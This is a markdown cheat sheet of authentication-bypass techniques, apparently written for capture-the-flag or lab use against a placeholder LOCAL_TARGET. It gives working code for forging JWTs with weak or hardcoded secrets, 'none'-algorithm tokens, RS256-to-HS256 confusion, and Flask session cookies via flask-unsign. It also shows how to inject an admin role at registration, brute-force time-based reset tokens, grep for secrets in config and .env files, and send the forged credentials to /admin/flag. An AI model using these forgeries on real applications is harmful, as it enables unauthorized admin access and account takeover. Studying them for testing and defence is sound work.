# Auth Weakness Patterns Reference

## Category 1 — Weak / Hardcoded Secret (JWT)

```python
# /tmp/aurelinth/test_jwt_forge.py
import jwt  # PyJWT

secret = "dev"  # from source reading
payload = {"user_id": 1, "role": "admin", "username": "admin"}
token = jwt.encode(payload, secret, algorithm="HS256")
print("Forged token:", token)
```
Test: `curl -H "Authorization: Bearer FORGED_TOKEN" LOCAL_TARGET/admin/flag`

## Category 2 — Algorithm Confusion (RS256 → HS256)

```bash
# Get public key from /jwks.json or source
# Sign with public key using HS256 — server expects RS256 but accepts HS256
python3 ~/tools/jwt_tool/jwt_tool.py TOKEN -X k -pk public.pem
```

## Category 3 — None Algorithm

```python
# /tmp/aurelinth/test_jwt_none.py
import base64, json

header = base64.urlsafe_b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).rstrip(b'=').decode()

payload = base64.urlsafe_b64encode(
    json.dumps({"user_id":1,"role":"admin"}).encode()
).rstrip(b'=').decode()

token = f"{header}.{payload}."
print("None-alg token:", token)
```

## Category 4 — Logic Bypass (no crypto — role from user input)

```python
# /tmp/aurelinth/test_auth_logic.py
import requests
s = requests.Session()
r = s.post("http://LOCAL_TARGET/register",
    json={"username":"pwn","password":"pwn","role":"admin"})
print(r.status_code, r.text[:200])
```
Check if the app accepts `role` from registration input without validation.

## Category 5 — Session Forgery (Flask SECRET_KEY known)

```bash
pip install flask-unsign --break-system-packages -q
flask-unsign --sign \
  --cookie "{'user_id': 1, 'role': 'admin', 'username': 'admin'}" \
  --secret 'dev'
```
Then use forged cookie in requests.

## Category 6 — Password Reset / Predictable Token

```python
# From source: token = str(int(time.time()))
import time
for delta in range(-5, 5):
    token = str(int(time.time()) + delta)
    print(token)
```

---

## Extraction Patterns from Source

```bash
# JWT secret
grep -n "SECRET\|secret_key\|JWT_SECRET" SOURCE_CODE/config.py SOURCE_CODE/.env

# Session config
grep -n "SECRET_KEY\|app.secret_key" SOURCE_CODE/app.py

# Registration handler — does it accept role from input?
grep -A 20 "def register" SOURCE_CODE/app.py

# Algorithm field in JWT creation
grep -n "algorithm\|encode\|decode" SOURCE_CODE/app.py
```

---

## Test Exploit Delivery

```python
import requests
s = requests.Session()

# Cookie-based
s.cookies.set("session", "FORGED_COOKIE")
r = s.get("http://LOCAL_TARGET/admin/flag")
print(r.status_code, r.text[:300])

# Bearer token
r = s.get("http://LOCAL_TARGET/admin/flag",
    headers={"Authorization": f"Bearer {forged_token}"})
print(r.status_code, r.text[:300])
```
